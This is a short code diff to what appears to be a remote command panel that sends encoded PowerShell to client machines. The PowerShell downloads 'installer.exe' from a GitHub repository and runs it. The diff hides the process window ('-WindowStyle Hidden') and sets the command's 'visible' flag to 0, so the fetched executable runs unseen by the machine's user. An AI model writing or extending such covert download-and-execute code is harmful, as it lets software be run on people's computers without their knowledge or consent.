@@ -634,7 +634,7 @@ $sha = (Invoke-RestMethod 'https://api.github.com/repos/yuan-miranda/run/commits
 $o = "$p\\installer.exe"
 
 Invoke-WebRequest -Uri "https://github.com/yuan-miranda/run/raw/$sha/installer.exe" -OutFile $o
-Start-Process $o`;
+Start-Process -FilePath $o -WindowStyle Hidden`;
 
     async function doSendUpdateClient() {
         if (isSendingCommand) return;
@@ -657,7 +657,7 @@ Start-Process $o`;
         const body = {
             username: user.username,
             cmd: encodedCmd,
-            visible: 1
+            visible: 0
         };
 
         try {
